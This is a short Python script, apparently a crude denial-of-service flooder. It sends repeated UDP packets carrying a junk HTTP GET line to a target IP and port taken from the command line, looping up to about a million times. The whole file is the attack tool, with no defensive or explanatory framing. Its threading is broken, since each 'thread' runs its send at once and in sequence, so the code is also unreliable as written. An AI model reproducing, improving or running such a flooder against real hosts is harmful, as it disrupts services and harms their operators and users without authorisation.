import asyncio
import socket
import string
import threading
from colorama import Fore, Back
import sys

class weee:
	def __init__(self,ip,port=None,threads=None):
		self.ip=ip
		self.port=port
		self.threads=threads


	def start(self,ip,port=None):
		self.sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
		try:
			url_path=str(string.ascii_letters + string.digits + string.punctuation)
			byt = (f"GET /{url_path} HTTP/1.1\nip: {ip}\n\n").encode()
			if not port:
				self.sock.sendto(byt,(ip,80))
			elif port:
				self.sock.sendto(byt,(ip,int(port)))
			print(Fore.GREEN+"""[+] Success""")
		except Exception as e:
			print(Fore.RED+f"""[-] Socket ERROR!\n[-] EXCEPTION : {e} """)



	async def wooo(self):
		if self.ip and self.port:
			if int(self.threads):
				for i in range(1, int(self.threads)):
					threading.Thread(target=self.start(self.ip, self.port)).start()
			else:
				for i in range(1, 1000):
					threading.Thread(target=self.start(self.ip, self.port)).start()
		elif self.ip and not self.port:
			if int(self.threads):
				for i in range(1, int(self.threads)):
					threading.Thread(target=self.start(self.ip)).start()
			else:
				for i in range(1, 1000):
					threading.Thread(target=self.start(self.ip)).start()

async def main():
	for i in range(1, 1000):
	   await asyncio.gather(app.wooo())

if __name__=="__main__":
	ip = sys.argv[1]
	port = sys.argv[2] if len(sys.argv) > 2 else None
	threads = sys.argv[3] if len(sys.argv) > 3 else None
	app=weee(ip,port,threads)
	asyncio.run(main())


